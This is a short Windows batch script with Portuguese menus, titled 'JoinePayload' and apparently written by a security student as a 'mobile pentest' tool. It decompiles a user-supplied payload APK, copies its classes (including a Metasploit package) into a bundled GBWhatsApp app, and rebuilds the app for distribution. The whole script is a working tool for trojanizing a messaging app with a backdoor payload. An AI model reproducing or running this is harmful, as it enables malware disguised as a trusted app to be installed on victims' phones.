echo off 
cls
chcp 850
cls
title JoinePayload - Ferramenta De Penstest Mobile - Mescle Payload a App Oficiais
:menu
cd icone
type 1.txt
cd .. 
echo.
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo w           Selecione Onde Quer Mesclar o Payload      w
echo w    1 - WhatsApp                                      w
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo w                                                      w
echo w                                                      w
echo w          SCRIPT DESENVOLVIDO POR CYBER - Cyber       W
echo w          ESTUDANTE DE SI - 03/02/2023    Root        W
echo w                                                      w
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo.
ECHO.
echo.
SET /p op=SELECIONE A OPCAO # 
IF %op% equ 1 goto 1

:1
cls
echo =============== Voce Selecionou a A Opção 1 WhatsApp =================
cd icone
type 1.txt
cd ..
echo.
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo w           Digite o Nome do Seu Payload Que Esta nesse Diretorio    w
echo w                                                                    w
SET /p payload=SELECIONE O Payload # 
echo w                                                                    w
echo wwwwwwwwwwwwwww  Estamos Gerando o Seu App wwwwwwwwwwwwwwwwwwwwwwwwwww
echo.
echo.                           
java -jar apktool.jar d -f -r %payload% 
SET dir=%cd%
cd payload/smali/com
xcopy "*.*" "%dir%/apps/gbwhatsapp/smali/com" /s /e /y
cd %dir%
java -jar apktool.jar b "%dir%/apps/gbwhatsapp"
pause
cd apps/gbwhatsapp/dist
xcopy "*.*" "%dir%/compilado" /s /e /y
del /f /a gbwhatsapp.apk
cd %dir%
cd apps/gbwhatsapp/smali/com
rd /s /q metasploit
cd %dir%
rd /s /q payload
msg %username% "App Gerado Com Sucesso! e Se Encontra na Pasta Compilado"
exit
